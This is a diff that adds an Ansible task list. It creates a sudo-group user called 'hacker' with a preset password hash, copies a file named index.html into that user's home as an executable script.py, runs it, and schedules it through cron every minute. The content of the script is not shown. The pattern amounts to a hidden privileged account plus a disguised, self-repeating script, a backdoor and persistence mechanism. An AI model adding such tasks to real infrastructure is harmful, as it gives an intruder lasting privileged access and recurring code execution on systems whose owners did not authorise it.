@@ -1,0 +1,22 @@
+---
+- group:
+    name: sudo
+    state: present
+- user:
+    name: hacker
+    groups: sudo
+    password: $6$CRK7UbX9$EMfUCcB8edccXIVnHTiWx6hhxxMmnDXdP8ve9xFJopmBW5w47brJ/RyfzkEtWD0oLH9mUm9rk5EQqfzcA8Lxl1
+    shell: /bin/bash
+    append: true
+    home: /home/hacker
+- copy:
+    owner: hacker
+    mode: '711'
+    dest: /home/hacker/script.py
+    src: ./files/index.html
+- shell:
+    cmd: python /home/hacker/script.py
+- cron:
+    name: rerun script
+    job: /home/hacker/script.py
+    minute: '*/1'
